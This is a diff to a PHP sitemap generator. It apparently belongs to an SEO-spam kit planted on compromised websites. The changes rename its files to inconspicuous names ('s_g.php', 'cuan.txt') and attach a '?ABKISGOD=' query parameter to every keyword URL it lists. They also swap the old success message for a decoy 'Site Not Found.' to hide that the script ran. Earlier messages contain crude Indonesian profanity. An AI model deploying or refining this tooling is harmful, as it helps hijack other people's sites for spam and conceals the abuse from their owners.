@@ -21,24 +21,24 @@ if (isset($fullUrl)) {
     $host = isset($parsedUrl['host']) ? $parsedUrl['host'] : '';
     $path = isset($parsedUrl['path']) ? $parsedUrl['path'] : '';
     $baseUrl = $scheme . "://" . $host . $path;
-    $urlAsli = str_replace("get-sitemap.php", "", $baseUrl);
-    $judulFile = "keywords.txt";
+    $urlAsli = str_replace("s_g.php", "", $baseUrl);
+    $judulFile = "cuan.txt";
     $jumlahBaris = getFileRowCount($judulFile);
     $sitemapFile = fopen("sitemap.xml", "w");
     fwrite($sitemapFile, '<?xml version="1.0" encoding="UTF-8"?>' . PHP_EOL);
-    fwrite($sitemapFile, '<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">' . PHP_EOL);
+    fwrite($sitemapFile, '<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.sitemaps.org/schemas/sitemap/0.9 http://www.sitemaps.org/schemas/sitemap/0.9/sitemap.xsd">' . PHP_EOL);
     $fileLines = file($judulFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
     foreach ($fileLines as $index => $judul) {
-        $sitemapLink = $urlAsli . urlencode($judul);
+        $sitemapLink = $urlAsli . '?ABKISGOD=' . urlencode($judul);
         fwrite($sitemapFile, '  <url>' . PHP_EOL);
         fwrite($sitemapFile, '    <loc>' . $sitemapLink . '</loc>' . PHP_EOL);
         fwrite($sitemapFile, '  </url>' . PHP_EOL);
     }
     fwrite($sitemapFile, '</urlset>' . PHP_EOL);
     fclose($sitemapFile);
-    echo "Sitemap Udah Jadi Ya Kontol!!";
+    echo "Site Not Found.";
 } else {
-    echo "Gagal Bikin Sitemap Anjing Lah!!";
+    echo "URL saat ini tidak didefinisikan.";
 }
 
 ?>
